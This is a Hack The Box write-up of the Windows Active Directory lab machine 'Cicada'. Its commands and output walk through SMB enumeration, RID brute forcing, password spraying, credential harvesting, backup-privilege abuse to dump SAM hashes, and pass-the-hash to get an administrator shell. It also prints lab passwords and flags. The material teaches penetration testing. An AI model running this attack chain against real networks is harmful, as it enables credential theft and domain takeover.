---
layout: single
title: Cicada - Hack The Box
excerpt: ""
date: 2025-02-15
classes: wide
header:
  teaser: /assets/images/
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - hackthebox
tags:
  - Active Directory
  - SMB
  - LDAP
  - SeBackupPrivilege
---

## Summary

Cicada is a windows AD box which required enumerating SMB shares to retrieve a default password in a note and then bruteforcing RID to obtain a list of users to perform a password spray attack. This leads to obtaining a user with shell access as well as being in the Backup Operators group. These privileges are used to dump registry hives and dump the machine hashes

## Box Details

- OS: Windows
- Difficulty: Easy

<img src="/assets/images/cicada/cicada-logo.png">

## Scanning

- nmap TCP Port Scans

```
$ sudo nmap -p- --min-rate 10000 10.129.118.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 15:16 CST
Nmap scan report for 10.129.118.69
Host is up (0.0087s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
54260/tcp open  unknown
```

- nmap UDP Port Scan

```
$ sudo nmap -sU -p- --min-rate 10000 10.129.118.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 15:17 CST
Nmap scan report for 10.129.118.69
Host is up (0.0090s latency).
Not shown: 65532 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
```

- nmap Service Scans

```
$ sudo nmap -p- --min-rate 10000 10.129.118.69 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 15:19 CST
Nmap scan report for 10.129.118.69
Host is up (0.0088s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-15 04:20:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
54260/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-15T04:20:54
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.84 seconds
```

##  Enumeration

### 445 - SMB

Guest account can enumerate shares

```
$ nxc smb 10.129.118.69 -u guest -p '' --shares
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.118.69   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.118.69   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.118.69   445    CICADA-DC        -----           -----------     ------
SMB         10.129.118.69   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.118.69   445    CICADA-DC        C$                              Default share
SMB         10.129.118.69   445    CICADA-DC        DEV                             
SMB         10.129.118.69   445    CICADA-DC        HR              READ            
SMB         10.129.118.69   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.118.69   445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.118.69   445    CICADA-DC        SYSVOL                          Logon server share
```

Using nxc spider_plus module, there was a note in the HR share 

```
$ nxc smb 10.129.118.69 -u guest -p '' -M spider_plus
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\guest: 
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.129.118.69   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.118.69   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.118.69   445    CICADA-DC        -----           -----------     ------
SMB         10.129.118.69   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.118.69   445    CICADA-DC        C$                              Default share
SMB         10.129.118.69   445    CICADA-DC        DEV                             
SMB         10.129.118.69   445    CICADA-DC        HR              READ            
SMB         10.129.118.69   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.118.69   445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.118.69   445    CICADA-DC        SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.129.118.69.json".
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Readable Shares:  2 (HR, IPC$)
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Total folders found:  0
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Total files found:    1
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size average:    1.24 KB
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size min:        1.24 KB
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size max:        1.24 KB
┌─[eu-dedivip-1]─[10.10.14.162]─[ricobandy@htb-akxjfi4ivc]─[~]
└──╼ [★]$ cat /tmp/nxc_hosted/nxc_spider_plus/10.129.118.69.json
{
    "HR": {
        "Notice from HR.txt": {
            "atime_epoch": "2024-08-28 12:31:48",
            "ctime_epoch": "2024-03-14 07:29:03",
            "mtime_epoch": "2024-08-28 12:31:48",
            "size": "1.24 KB"
        }
    }
}
```

Downloading the note

```
$ smbclient \\\\10.129.118.69\\HR guest
Password for [WORKGROUP\ricobandy]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

    4168447 blocks of size 4096. 435513 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (33.4 KiloBytes/sec) (average 33.4 KiloBytes/sec)
smb: \> 
```

We have a password from the note but no usernames yet

```
$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8
kerb  
To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Using RID Brute forcing

```
$ nxc smb 10.129.118.69 -u guest -p '' --rid-brute
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.118.69   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.118.69   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.118.69   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.118.69   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.118.69   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.118.69   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.118.69   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.118.69   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Testing all found users with the default password

```
nxc smb 10.129.118.69 -u final-users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

The user `michael.wrightson` authenticates to SMB and LDAP with this default password but not for Winrm.

### 389 - LDAP

With LDAP access, we enumerate further to find password for user `david.orelious`

```
$ nxc ldap 10.129.118.69 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.129.118.69   389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.118.69   389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.118.69   389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
LDAP        10.129.118.69   389    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain      
LDAP        10.129.118.69   389    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain    
LDAP        10.129.118.69   389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account                     
LDAP        10.129.118.69   389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1                                                                   
LDAP        10.129.118.69   389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1                                                                   
LDAP        10.129.118.69   389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                                                                   
LDAP        10.129.118.69   389    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3         
LDAP        10.129.118.69   389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0
```

Enumerating user `david.orelious` on SMB, we had access to new share DEV

```
$ nxc smb 10.129.118.69 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.118.69   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.118.69   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.118.69   445    CICADA-DC        -----           -----------     ------
SMB         10.129.118.69   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.118.69   445    CICADA-DC        C$                              Default share
SMB         10.129.118.69   445    CICADA-DC        DEV             READ            
SMB         10.129.118.69   445    CICADA-DC        HR              READ            
SMB         10.129.118.69   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.118.69   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.118.69   445    CICADA-DC        SYSVOL          READ            Logon server share 
```

After spidering the DEV share, I found a script  `Backup_script.ps1`

```
$ nxc smb 10.129.118.69 -u david.orelious -p 'aRt$Lp#7t*VQ!3' -M spider_plus 
SMB         10.129.118.69   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.118.69   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.129.118.69   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.118.69   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.118.69   445    CICADA-DC        -----           -----------     ------
SMB         10.129.118.69   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.118.69   445    CICADA-DC        C$                              Default share
SMB         10.129.118.69   445    CICADA-DC        DEV             READ            
SMB         10.129.118.69   445    CICADA-DC        HR              READ            
SMB         10.129.118.69   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.118.69   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.118.69   445    CICADA-DC        SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.129.118.69.json".
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Shares:           7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Readable Shares:  5 (DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Total folders found:  33
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] Total files found:    12
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size average:    1.09 KB
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size min:        23 B
SPIDER_PLUS 10.129.118.69   445    CICADA-DC        [*] File size max:        5.22 KB
┌─[eu-dedivip-1]─[10.10.14.162]─[ricobandy@htb-akxjfi4ivc]─[~/cicada]
└──╼ [★]$ cat /tmp/nxc_hosted/nxc_spider_plus/10.129.118.69.json
{
    "DEV": {
        "Backup_script.ps1": {
            "atime_epoch": "2024-08-28 12:28:22",
            "ctime_epoch": "2024-03-14 07:31:38",
            "mtime_epoch": "2024-08-28 12:28:22",
            "size": "601 B"
        }
    }
```

From the script we found another creds for user emily.oscars

```
$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Foothold as emily.oscars

This user has remote access to the server

```
$ nxc winrm 10.129.118.69 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.129.118.69   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.118.69   5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

With the user found we connect remotely to the server to get the user.txt

```
$ evil-winrm -i 10.129.118.69 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir -force


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/14/2025   8:15 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
8760fa941833ea388f10f7bc9519d6bd
```

## Privilege Escalation

This user is part of the `Backup Operators` group and has the `SeBackupPrivilege` and `SeRestorePrivilege` privileges. Using robocopy to copy the root flag

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy /b C:\Users\Administrator\Desktop\ C:\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, February 15, 2025 4:07:01 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                     3  C:\Users\Administrator\Desktop\
  *EXTRA Dir        -1  C:\$Recycle.Bin\
  *EXTRA Dir        -1  C:\$WinREAgent\
  *EXTRA Dir        -1  C:\Documents and Settings\
  *EXTRA Dir        -1  C:\PerfLogs\
  *EXTRA Dir        -1  C:\Program Files\
  *EXTRA Dir        -1  C:\Program Files (x86)\
  *EXTRA Dir        -1  C:\ProgramData\
  *EXTRA Dir        -1  C:\Recovery\
  *EXTRA Dir        -1  C:\Shares\
  *EXTRA Dir        -1  C:\System Volume Information\
  *EXTRA Dir        -1  C:\Users\
  *EXTRA Dir        -1  C:\Windows\
    *EXTRA File        12288  DumpStack.log.tmp
    *EXTRA File      704.0 m  pagefile.sys
      New File            32  .root.txt.txt
  0%
100%
      New File           282  desktop.ini
  0%
100%
      New File            34  root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0        12
   Files :         3         3         0         0         0         2
   Bytes :       348       348         0         0         0  704.01 m
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :              21,750 Bytes/sec.
   Speed :               1.245 MegaBytes/min.
   Ended : Saturday, February 15, 2025 4:07:01 AM

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\..\..
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows
-ar---         2/14/2025   8:15 PM             34 root.txt


*Evil-WinRM* PS C:\> type root.txt
aff04caa2716dd1f90e3370609990de5
*Evil-WinRM* PS C:\> 
```

- We can also backup the sam and system files for hash extraction

```
*Evil-WinRM* PS C:\windows\temp> reg save hklm\sam SAM
The operation completed successfully.

*Evil-WinRM* PS C:\windows\temp> reg save hklm\system SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\windows\temp> download SAM
                                        
Info: Downloading C:\windows\temp\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> download SYSTEM
                                        
Info: Downloading C:\windows\temp\SYSTEM to SYSTEM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> 

```

Successfully extracted the hashes

```
$ secretsdump.py LOCAL -sam SAM -system SYSTEM 
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

The hash for Administrator works for SMB

```
$ nxc smb 10.129.62.87 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
SMB         10.129.62.87    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.62.87    445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
```

-We have access to the root.txt

```
$ psexec.py Administrator@10.129.62.87 -hashes :2b87e7c93a3e8a0ea4a581937016f341
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.62.87.....
[*] Found writable share ADMIN$
[*] Uploading file ilUlJRMr.exe
[*] Opening SVCManager on 10.129.62.87.....
[*] Creating service EJXG on 10.129.62.87.....
[*] Starting service EJXG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop> type root.txt
c58a326871977a3a2ae0976f25e6ff18

c:\Users\Administrator\Desktop> 
```